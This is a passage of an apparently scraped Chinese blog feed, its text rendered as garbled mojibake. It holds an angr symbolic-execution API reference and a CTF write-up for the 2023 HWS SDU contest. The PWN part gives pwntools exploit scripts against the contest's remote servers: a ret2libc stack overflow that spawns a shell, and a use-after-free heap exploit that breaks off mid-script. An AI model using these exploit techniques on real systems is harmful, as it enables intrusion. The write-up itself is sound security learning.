<h1 id="0x01-åº“æ¶æ„åˆ†æ"><a href="#0x01-åº“æ¶æ„åˆ†æ" class="headerlink" title="0x01 åº“æ¶æ„åˆ†æ"></a>0x01 åº“æ¶æ„åˆ†æ</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
<h1 id="0x02-APIæ‰‹å†Œ"><a href="#0x02-APIæ‰‹å†Œ" class="headerlink" title="0x02 APIæ‰‹å†Œ"></a>0x02 APIæ‰‹å†Œ</h1><ul>
<li><p><strong>Projectç±»(å‚æ•°ã€åŠŸèƒ½ã€é‡è½½ã€è¿”å›å€¼)</strong></p>
<ol>
<li>æ„é€ å‡½æ•°å‚æ•°ï¼šâ€œå‘½ä»¤è¡Œä¸­è¿è¡Œç¨‹åºçš„æŒ‡ä»¤â€(eg: â€œ./00_angr_findâ€)</li>
<li>åŠŸèƒ½ï¼šâ€œæ„å»ºä¸€ä¸ªç¬¦å·æ‰§è¡Œé¡¹ç›®â€</li>
<li>é™„å±æˆå‘˜<ul>
<li><strong>factory</strong><ol>
<li>é™„å±æˆå‘˜<ul>
<li><strong>state</strong><ol>
<li>é‡è½½å‡½æ•°<ul>
<li><strong>entry_state()</strong><ol>
<li>è¿”å›å€¼ï¼šç¨‹åºå…¥å£ç‚¹</li>
</ol>
</li>
<li><strong>blank_state(addr)</strong><ol>
<li>å‚æ•°ï¼šæ¨¡æ‹Ÿæ‰§è¡Œå¼€å§‹çš„åœ°å€</li>
</ol>
</li>
</ul>
</li>
<li>é™„å±æˆå‘˜<ul>
<li><strong>regs</strong><ol>
<li>é™„å±æˆå‘˜: å„ç§å¯„å­˜å™¨</li>
</ol>
</li>
<li><strong>fs</strong><ol>
<li>å…¨ç§°: filesystem</li>
<li>é™„å±æˆå‘˜ï¼š<ul>
<li><strong>insert(string filename,angr.storage.simFile)</strong><ol>
<li>å‚æ•°1ï¼šæ–‡ä»¶åç§°</li>
<li>å‚æ•°2ï¼šåˆ›å»ºè¿‡çš„ç¬¦å·åŒ–æ–‡ä»¶å¯¹è±¡</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
<li><strong>simulation_managerç±»</strong><ol>
<li>æ„é€ å‡½æ•°å‚æ•°ï¼šèµ·å§‹çŠ¶æ€</li>
<li>åŠŸèƒ½ï¼šè®¾ç½®æ¨¡æ‹Ÿæ‰§è¡Œçš„èµ·å§‹åœ°å€ï¼Œå¹¶è¿”å›å®ä¾‹åŒ–å¯¹è±¡</li>
<li>é™„å±æˆå‘˜<ul>
<li><strong>explore(find, avoid)</strong><ol>
<li>å‚æ•°findï¼šå¸Œæœ›ç¨‹åºæŠµè¾¾çš„åœ°å€</li>
<li>å‚æ•°avoidï¼šå¸Œæœ›ç¨‹åºä¸æŠµè¾¾çš„åœ°å€</li>
<li>åŠŸèƒ½ï¼šç”¨ç¬¦å·æ¢ç´¢åˆ°findæŒ‡å‘çš„åœ°å€ï¼Œå¹¶é¿å…avoidæŒ‡å‘çš„åœ°å€</li>
<li>é‡è½½ï¼šexplore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
<ol>
<li>åŠŸèƒ½ï¼šæ¢ç´¢å…·æœ‰func1ç‰¹å¾çš„çš„å‡½æ•°åˆ†æ”¯ï¼Œå›é¿å…·æœ‰func2ç‰¹å¾çš„å‡½æ•°åˆ†æ”¯</li>
</ol>
</li>
</ol>
</li>
<li><strong>foundæ•°ç»„</strong><ol>
<li>found_stateçš„å®ä¾‹åŒ–æ•°ç»„</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
<li><p><strong>found_stateç±»</strong></p>
<ul>
<li><strong>posix</strong><ul>
<li><strong>dumps(int std)</strong><ol>
<li>å‚æ•°std: stdin(0)/stdout(1)/stderr(2)</li>
<li>åŠŸèƒ½: å°†stdæŒ‡å‘çš„å†…å®¹æ‰“å°å‡ºæ¥</li>
</ol>
</li>
</ul>
</li>
<li>solver<ul>
<li>eval(claripy.BVS arg1)<ol>
<li>å‚æ•°ï¼šè¦æ±‚è§£çš„çº¦æŸå…¬å¼</li>
<li>åŠŸèƒ½ï¼šæ±‚è§£arg1å¹¶è¿”å›ç»“æœ</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>claripyç±»</strong></p>
<ul>
<li><strong>BVSç±»</strong><ol>
<li>æ„é€ å‡½æ•°å‚æ•°ï¼šarg1: åˆ«å | arg2: ç¬¦å·å‘é‡å å¤šå°‘ä½</li>
<li>åŠŸèƒ½ï¼šæ„å»ºä¸€ä¸ªç©ºçš„çº¦æŸå…¬ç¤º</li>
</ol>
</li>
</ul>
</li>
<li><p><strong>storageç±»</strong></p>
<ul>
<li>SimFile(filename,content,size)<ol>
<li>å‚æ•°filenameï¼šè¦å¼•å…¥çš„filename</li>
<li>å‚æ•°contentï¼šç¬¦å·åŒ–å‘é‡</li>
<li>å‚æ•°sizeï¼šè¦ä»æ–‡ä»¶ä¸­è¯»å–çš„å­—èŠ‚æ•°*8ï¼ˆå•ä½ï¼šbitsï¼‰</li>
<li>åŠŸèƒ½ï¼šåˆ›å»ºä¸€ä¸ªç¬¦å·åŒ–çš„æ–‡ä»¶å¯¹è±¡</li>
</ol>
</li>
</ul>
</li>
<li><p><strong>sim_optionsç±»</strong></p>
<ul>
<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY<ul>
<li>åŠŸèƒ½ï¼šè‡ªåŠ¨ç”¨ç¬¦å·å¡«å……æœªçº¦æŸçš„å†…å­˜ï¼ˆæ¨¡æ‹Ÿè¿‡ç¨‹ä¸­æ²¡æœ‰æ˜ç¡®å€¼çš„å†…å­˜ä½ç½®ï¼‰</li>
</ul>
</li>
<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<ul>
<li>åŠŸèƒ½ï¼šè‡ªåŠ¨ç”¨ç¬¦å·å¡«å……æœªçº¦æŸçš„å¯„å­˜å™¨</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="0x01-Angrè¯­æ³•"><a href="#0x01-Angrè¯­æ³•" class="headerlink" title="0x01  Angrè¯­æ³•"></a>0x01  Angrè¯­æ³•</h1><h3 id="1-å‡†å¤‡é˜¶æ®µ"><a href="#1-å‡†å¤‡é˜¶æ®µ" class="headerlink" title="1. å‡†å¤‡é˜¶æ®µ"></a>1. å‡†å¤‡é˜¶æ®µ</h3><ul>
<li><p><strong>å¼•å…¥ä¸åˆå§‹åŒ–</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>å‘½ä»¤è¡Œå¼•å…¥å‚æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">	arg1 = argv[1]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ç¬¦å·å‘é‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(&#x27;pass1&#x27;, 32)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ç¬¦å·åŒ–å¯„å­˜å™¨</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ç¬¦å·åŒ–æ–‡ä»¶</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename = &quot;&quot;</span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(&#x27;password&#x27;,filesize*8)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-æ¢ç´¢é˜¶æ®µ"><a href="#2-æ¢ç´¢é˜¶æ®µ" class="headerlink" title="2. æ¢ç´¢é˜¶æ®µ"></a>2. æ¢ç´¢é˜¶æ®µ</h3><ul>
<li><p><strong>æ¢ç´¢æŒ‡å®šåœ°å€å¹¶æŸ¥çœ‹æ ‡å‡†æµ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>åˆ©ç”¨å‡½æ•°exploreåˆ†æ”¯</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def is_good(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def is_bad(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"># sm.explore(find=addr_find, avoid=addr_avoid)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-è¾“å‡ºé˜¶æ®µ"><a href="#3-è¾“å‡ºé˜¶æ®µ" class="headerlink" title="3. è¾“å‡ºé˜¶æ®µ"></a>3. è¾“å‡ºé˜¶æ®µ</h3><ul>
<li><p><strong>æŸ¥çœ‹ç»“æœ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if sm.found:</span><br><span class="line">	found_state = sm.found[0]</span><br><span class="line">	</span><br><span class="line">	print(&#x27;[x] Solution: &#123;&#125;&#x27;.format(found_state.posix.dumps(0)))</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>æ±‚è§£å¯„å­˜å™¨çš„ç¬¦å·å‘é‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.eval(BVS)</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>2023HwsSDUä¸“åœºCTF-wp</title>
    <url>/2023/11/19/blog17/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
HWSï¼PWN+RE+CRYPTO
</blockquote>

<span id="more"></span>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><blockquote>
<p>è¿™ä¸ªé¢˜æœ¬æ¥æ‰“å¥½é€†å‘åçš„åŒ…å‡†å¤‡å†™ wp çš„ï¼Œç»“æœé‡æ–°åŠ è½½çš„æ—¶å€™ç»™è¦†ç›–äº†â€¦å°±ä¸é…å›¾äº†ï¼Œå‡½æ•°é¡ºåºæŒ‰ç…§åæ±‡ç¼–ä»ä¸Šåˆ°ä¸‹æ¥åˆ†æçš„ã€‚</p>
</blockquote>
<p>æ‹¿åˆ°è¿™ä¸ªé¢˜çœ‹åˆ°æœ‰åè°ƒè¯•ï¼Œæ²¡ patch ï¼Œç›´æ¥é™æ€åˆ†æäº†</p>
<h4 id="1st-important-function"><a href="#1st-important-function" class="headerlink" title="- 1st important function"></a>- 1st important function</h4><p>ç¬¬ä¸€ä¸ªé‡è¦å‡½æ•°é‡Œæœ‰ä¸€ä¸ª flag{} çš„åˆ¤æ–­ï¼Œè¿˜æœ‰ä¸€ä¸ªå¯¹äºâ€™-â€˜çš„åˆ¤æ–­ï¼Œå¯ä»¥çŒœæµ‹ flag çš„æ ¼å¼ä¸º flag{uuid}</p>
<p>æ¥ä¸‹æ¥çš„ä¸€ä¸ªå‡½æ•°æœ‰èŠ±æŒ‡ä»¤ï¼ŒæŠŠ E8 æ”¹æˆ 90 ä»¥åé‡æ–°åæ±‡ç¼–ï¼Œè¿˜æ˜¯æ²¡æœ‰å•¥ä¸œè¥¿â€¦ä¸ºäº†ä¸å½±å“åé¢åšé¢˜ï¼Œè¿˜æ˜¯å›åˆ°ä¸€å¼€å§‹çš„åœ°æ–¹æŠŠ jz æ”¹æˆäº† jnz ï¼Œç„¶ååŠ¨è°ƒå‘ç°è¿™ä¸ªå¸¦èŠ±çš„å‡½æ•°åŸºæœ¬æ²¡å•¥ç”¨ï¼Œå¥½åƒå°±è°ƒç”¨äº†ä¸ª<code>__chkesp</code>å‡½æ•°ï¼Œä½†æˆ‘ä¸å¤ªæ¸…æ¥šè¿™æ˜¯å¹²å•¥çš„ï¼Œå°±ç›´æ¥å¿½ç•¥äº†</p>
<h4 id="2nd-important-function"><a href="#2nd-important-function" class="headerlink" title="- 2nd important function"></a>- 2nd important function</h4><p>ç¬¬äºŒä¸ªé‡è¦å‡½æ•°å¯¹æˆ‘ä»¬è¾“å…¥çš„ flag åšäº†ä¸€äº›æ“ä½œï¼ŒæŠŠä¸­é—´çš„â€™-â€˜å…¨éƒ¨åˆ æ‰ï¼Œå¹¶åšäº†ä¸€äº›ç§»åŠ¨çš„æ“ä½œï¼Œå¤§æ¦‚å°±æ˜¯<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa&#125;</span><br><span class="line">flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="3rd-important-function"><a href="#3rd-important-function" class="headerlink" title="- 3rd important function"></a>- 3rd important function</h4><p>ç¬¬ä¸‰ä¸ªå‡½æ•°å°† uuid çš„å‰ 32 ä¸ªå­—èŠ‚ä½œä¸ºå‚æ•°ï¼Œåšäº†ä¸€äº›å¼‚æˆ–æ“ä½œå’Œæ¯”å¯¹æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥æ¢å¤ä¸€éƒ¨åˆ† flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int encdata1[13];</span><br><span class="line">char encdata2[16];</span><br><span class="line">int encdata3[22];</span><br><span class="line">char flag[42]=&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxx&#125;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void func1()</span><br><span class="line">&#123;</span><br><span class="line">    encdata1[0] = 102;</span><br><span class="line">    encdata1[1] = 52;</span><br><span class="line">    encdata1[2] = 51;</span><br><span class="line">    encdata1[3] = 49;</span><br><span class="line">    encdata1[4] = 52;</span><br><span class="line">    encdata1[5] = 57;</span><br><span class="line">    encdata1[6] = 96;</span><br><span class="line">    encdata1[7] = 60;</span><br><span class="line">    encdata1[8] = 61;</span><br><span class="line">    encdata1[9] = 34;</span><br><span class="line">    encdata1[10] = 104;</span><br><span class="line">    encdata1[11] = 33;</span><br><span class="line">    encdata1[12] = 56;</span><br><span class="line">    int count = 5;</span><br><span class="line">    for (int i = 0; i &lt; 13; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        if ( i % 2 )</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ (2*i);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ i;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func1();</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># flag&#123;f61703f2-50b7-4aaa-aaaa-aaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªå‡½æ•°åªå¯¹å‰13ä¸ªå­—èŠ‚åšäº†æ“ä½œï¼Œå‰©ä¸‹çš„19ä¸ªå­—èŠ‚æ²¡ç”¨åˆ°</p>
<h4 id="4th-important-function"><a href="#4th-important-function" class="headerlink" title="- 4th important function"></a>- 4th important function</h4><p>ç¬¬å››ä¸ªå‡½æ•°å°† uuid çš„ä¸­é—´18ä½æ”¾äº†è¿›å»ï¼Œç„¶ååšäº†ä¸€å¤§å †æ“ä½œä»¥åè·Ÿä¸‹é¢çš„ä¸œè¥¿åšäº†æ¯”è¾ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v5[0] = 63;</span><br><span class="line">v5[1] = -70;</span><br><span class="line">v5[2] = -60;</span><br><span class="line">v5[3] = -111;</span><br><span class="line">v5[4] = -60;</span><br><span class="line">v5[5] = 116;</span><br><span class="line">v5[6] = 2;</span><br><span class="line">v5[7] = 38;</span><br><span class="line">v5[8] = -20;</span><br><span class="line">v5[9] = -110;</span><br><span class="line">v5[10] = 56;</span><br><span class="line">v5[11] = -62;</span><br><span class="line">v5[12] = 11;</span><br><span class="line">v5[13] = 109;</span><br><span class="line">v5[14] = 39;</span><br><span class="line">v5[15] = -45;</span><br></pre></td></tr></table></figure>
<p>ç”±äºçœ‹åˆ°äº†è¿™ä¸ªå‡½æ•°é‡Œé¢æœ‰ä¸ªå­å‡½æ•°æœ‰è¶…é•¿çš„ä¸€ä¸²ï¼Œè™½ç„¶çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘æ€€ç–‘è¿™åº”è¯¥æ˜¯æŸä¸ªåŠ å¯†ç®—æ³•çš„æ‰‹æ“ç‰ˆï¼Œäºæ˜¯å°±é—® GPT è€å¸ˆï¼Œå®ƒè·Ÿæˆ‘è¯´æ˜¯MD5åŠ å¯†ç®—æ³•çš„ä¸€éƒ¨åˆ†(åæ¥ç”¨ findcrypt æ’ä»¶ä¹Ÿèƒ½çœ‹å‡ºæ¥)ã€‚</p>
<p>è€Œåé¢è¿˜æœ‰ä¸ªå‡½æ•°æ˜¯è¿™18ä½ä¸­å‰14ä½çš„ base64_encode ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è§£ç ååªéœ€è¦çˆ†ç ´å4ä½å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def generate_md5(text):</span><br><span class="line">    return hashlib.md5(text.encode(&#x27;utf-8&#x27;)).digest()</span><br><span class="line"></span><br><span class="line">target_hash = ([63, -70, -60, -111, -60, 116, 2, 38, -20, -110, 56, -62, 11, 109, 39, -45])</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">    for j in range(16):</span><br><span class="line">        for k in range(16):</span><br><span class="line">            for m in range(16):</span><br><span class="line">        # å°†iå’Œjè½¬æ¢ä¸ºä¸¤ä½16è¿›åˆ¶æ•°</span><br><span class="line">                hex_i = format(i, &#x27;01x&#x27;)</span><br><span class="line">                hex_j = format(j, &#x27;01x&#x27;)</span><br><span class="line">                hex_k = format(k, &#x27;01x&#x27;)</span><br><span class="line">                hex_m = format(m, &#x27;01x&#x27;)</span><br><span class="line">        </span><br><span class="line">        # æ„å»ºå¾…åŠ å¯†çš„æ˜æ–‡</span><br><span class="line">                plaintext = f&#x27;f47813c26594c0&#123;hex_i&#125;&#123;hex_j&#125;&#123;hex_k&#125;&#123;hex_m&#125;&#x27;</span><br><span class="line">                # print(plaintext)</span><br><span class="line">                </span><br><span class="line">                # è®¡ç®—MD5æ•£åˆ—å€¼</span><br><span class="line">                hashed_text = generate_md5(plaintext)</span><br><span class="line">                # print(hashed_text.hex())</span><br><span class="line"></span><br><span class="line">                if hashed_text.hex() == &#x27;3fbac491c4740226ec9238c20b6d27d3&#x27;:</span><br><span class="line">                    print(plaintext)</span><br><span class="line"></span><br><span class="line"># flag&#123;f61703f2-50b7-4f47-813c-26594c0e581a&#125; // è¿™é‡Œçš„æœ€åä¸€ä½ a ä¸æ˜¯çœŸçš„ a ï¼Œæ˜¯å› ä¸ºä¸€å¼€å§‹æˆ‘å†™çš„ flag æ ¼å¼æ˜¯aï¼Œè¿™ä¸€ä½è¿˜æ˜¯éœ€è¦æˆ‘ä»¬çˆ†ç ´çš„</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°å¹³å°ä¸Šå»çˆ†ç ´æœ€åä¸€ä½ï¼Œæ²¡æƒ³åˆ°ç›´æ¥å°±æ˜¯ 0 ï¼Œä¸€éè¿‡~</p>
<blockquote>
<p>flag{f61703f2-50b7-4f47-813c-26594c0e5810}</p>
</blockquote>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="inverse"><a href="#inverse" class="headerlink" title="inverse"></a>inverse</h2><p>32ä½ + æ•´æ•°æº¢å‡º + ç®€å•æ ˆæº¢å‡ºï¼Œæ€è·¯çœŸæ²¡å•¥å¥½å†™çš„ï¼Œç›´æ¥ä¸Šexpå§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;124.71.135.126:30011&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">io.send(&#x27;/bin/sh&#x27;)</span><br><span class="line">io.sendline(&#x27;-1&#x27;)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">work_addr = 0x80493D5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = b&#x27;a&#x27;*0x40 + p32(puts_plt) + p32(work_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&#x27; msg:&#x27;)</span><br><span class="line">read_addr = u32(io.recv(4))</span><br><span class="line">print(&#x27;read_addr  ---&gt;  &#x27;,hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[&#x27;read&#x27;]</span><br><span class="line">sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh  =  libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">bin_sh = 0x0804C030</span><br><span class="line">print(&#x27;libc_base  ---&gt;  &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr  ---&gt;  &#x27;,hex(sys_addr))</span><br><span class="line">print(&#x27;bin_sh  ---&gt;  &#x27;,hex(bin_sh))</span><br><span class="line"></span><br><span class="line">io.sendline(&#x27;-1&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x40 + p32(sys_addr) + p32(work_addr) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><p>è¿™é¢˜æ˜¯ awdp/awd çš„é¢˜å§ï¼Œå¥½å¤šæ´â€¦ä½†æ˜¯ä¸ºä»€ä¹ˆ patchelf ä»¥åä¼šç»™æˆ‘æŠ¥<code>libgcc_s.so.0</code>çš„é”™å•Šï¼Œæˆ‘è¿˜ä» lib64/lib/2.27libgccåº“ ä¸­æ‹·è´äº†å¯¹åº”æ–‡ä»¶ï¼Œç»“æœéƒ½ä¸è¡Œâ€¦</p>
<p>ç°ç›’çš„ heap é¢˜å¤ªéš¾æ‰“äº†â€¦ä¸è¿‡ä»22:00æ‰“åˆ°3:00å‡º flag çš„ä¸€ç¬é—´çœŸçš„å·¨çˆ½</p>
<p>è¿™é¢˜é€†å‘å°±æŒºè´¹æ—¶é—´çš„ï¼Œä¸€å †æ²¡å•¥ç”¨çš„å‡½æ•°ï¼Œå°±åªæœ‰<code>choice == 1/2/3/6(å †é¢˜çš„uaf) || choice == 1/9(fmt + æ ˆ)</code></p>
<p>â€¦å†™ wp çš„æ—¶å€™å»çœ‹äº†ä¸€ä¸‹ choice == 9ï¼Œç»“æœçªç„¶å‘ç° strlen ç”¨â€™\x00â€™ å°±å¯ä»¥éšä¾¿ç»•â€¦æ—©çŸ¥é“ä¸ç°ç›’æ‰“å †äº†â€¦</p>
<p>æˆ‘çš„æ€è·¯æ˜¯ uaf + fastbin attack</p>
<ul>
<li>alloc å† free ä¸¤ä¸ª chunk  </li>
<li>ç”±äº fastbin LIFOï¼Œåˆ©ç”¨ uaf å°† heap_list (å †æŒ‡é’ˆè¡¨)çš„åœ°å€å†™å…¥ chunk13 çš„ fd å’Œ bk </li>
<li>ç”³è¯·ä¸¤ä¸ªåŒæ ·å¤§å°çš„ chunk ï¼Œæˆ‘ä»¬å°±èƒ½ç”¨ chunk15 ä»»æ„åœ°å€è¯»å†™äº†</li>
<li>leak<ul>
<li>é¦–å…ˆæŠŠ malloc çš„ got å†™è¿› chunk15ï¼Œç„¶å showï¼Œå°±å¯ä»¥leak libc åŸºå€</li>
</ul>
</li>
<li>write<ul>
<li>ç”±äºè¿™ä¸ªæ—¶å€™ï¼Œheap_list ä¸­è¿˜å­˜æœ‰ malloc_got ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥æ§åˆ¶è¿™ä¸ªæŒ‡é’ˆå»å†™ malloc_got æŒ‡å‘çš„åœ°å€</li>
</ul>
</li>
<li>å°† one_gadget å†™å…¥ malloc_got æŒ‡å‘çš„åœ°å€ï¼Œå½“æˆ‘ä»¬å†å» malloc çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨ og è¿›è€Œææƒã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;124.71.135.126:30070&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content1,content2):</span><br><span class="line">  io.sendlineafter(&#x27;&gt; &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;length of the new pipe name? &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;name of the new pipe? &#x27;, content1)</span><br><span class="line">  io.sendlineafter(&#x27;Please write a description: &#x27;, content2)</span><br><span class="line">  io.sendlineafter(&#x27;(radius,speed,length): &#x27;,&#x27;1&#x27;)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt; &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Please choose pipe: &#x27;, str(index))</span><br><span class="line">  io.sendline()</span><br><span class="line">  </span><br><span class="line">def edit(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt; &#x27;, str(6))</span><br><span class="line">  io.sendlineafter(&#x27;Choose 